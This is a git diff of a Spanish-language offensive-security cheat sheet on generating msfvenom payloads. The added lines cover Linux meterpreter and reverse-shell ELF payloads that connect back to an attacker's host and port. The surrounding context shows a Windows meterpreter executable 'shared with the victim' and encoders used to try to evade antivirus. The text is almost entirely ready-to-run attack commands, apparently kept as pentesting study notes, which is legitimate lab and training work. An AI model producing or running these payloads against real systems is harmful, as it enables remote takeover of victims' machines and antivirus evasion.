@@ -34,7 +34,7 @@ msfvenom --list payloads
 msfvenom --list enconders (para codificar y tratar de evadir el AV)
 ```
 #### Payload sesión meterpreter Windows
-
+Esto es útil entre otras cosas para el pivoting con metasploit. De esta forma conseguimos una sesión de meterpreter.
 ```bash
 #Generamos el payload y lo compartimos con la víctima
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip_atacante> LPORT=443 -f exe -o fichero.exe
@@ -53,6 +53,12 @@ run
 
 ```
 
+#### Payload sesión meterpreter Linux
+Igual que con Windows, solo que cambiamos el payload utilizado, en este caso:
+```bash
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
+```
 #### Payload reverse shell PHP
 ```bash
 #Generamos el payload y lo compartimos con la víctima
